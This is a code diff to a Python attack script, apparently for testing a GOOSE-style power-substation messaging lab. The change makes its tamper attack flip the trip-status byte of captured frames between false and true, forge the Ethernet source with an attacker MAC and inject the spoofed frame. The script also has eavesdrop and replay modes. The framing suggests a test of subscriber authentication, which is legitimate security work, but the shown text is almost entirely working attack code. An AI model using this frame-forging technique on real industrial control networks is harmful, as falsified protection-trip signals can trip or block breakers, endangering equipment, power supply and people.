@@ -65,11 +65,21 @@ def start_hacker():
                 print(f"    [?] Status: SECURE. Payload appears to be encrypted/scrambled.")
                 print(f"    [?] Ciphertext Bytes: {secure_stream[:15].hex()}... (Unreadable)")
 
-        # --- 2. TAMPER ATTACK (Breaks Integrity / Authentication) ---
+        # --- 2. SURGICAL TAMPER ATTACK (Breaks Integrity / Authentication) ---
         elif args.attack == 'tamper':
-            if len(secure_stream) > 4:
-                # Swap out the last 4 bytes of the payload to invalidate the MAC/Signature or ASN.1 structure
-                tampered_stream = secure_stream[:-4] + b"DEAD"
+            if len(secure_stream) > 0:
+                # Isolate the very last byte of the payload (The Trip Status in PyGoose)
+                last_byte = secure_stream[-1:]
+                
+                # Check if the byte is 0x00 (False/No Trip)
+                if last_byte == b'\x00':
+                    # Flip to 0x0F (True/Trip) to match pygoose's expected true value
+                    tampered_stream = secure_stream[:-1] + b'\x0f'
+                    print("    [!] TAMPER: Detected TRIP=FALSE. Flipping to TRIP=TRUE!")
+                else:
+                    # Flip to 0x00 (False/No Trip)
+                    tampered_stream = secure_stream[:-1] + b'\x00'
+                    print("    [!] TAMPER: Detected TRIP=TRUE. Flipping to TRIP=FALSE!")
                 
                 # Forge the Ethernet header with our ATTACKER_MAC as the source
                 forged_eth_header = eth_header[:6] + ATTACKER_MAC + eth_header[12:14]
@@ -77,7 +87,8 @@ def start_hacker():
                 poisoned_frame = forged_eth_header + timestamp + tampered_stream
                 time.sleep(0.005) 
                 sock.send(poisoned_frame)
-                print(f"    [+] Poisoned frame injected! Replaced end of payload with 'DEAD'")
+                
+                print(f"    [+] Surgical Poison injected! Only the Trip bit was modified.")
                 print(f"    [+] Let's see if the Subscriber's Authentication catches it...")
 
         # --- 3. REPLAY ATTACK (Breaks Freshness / Availability) ---
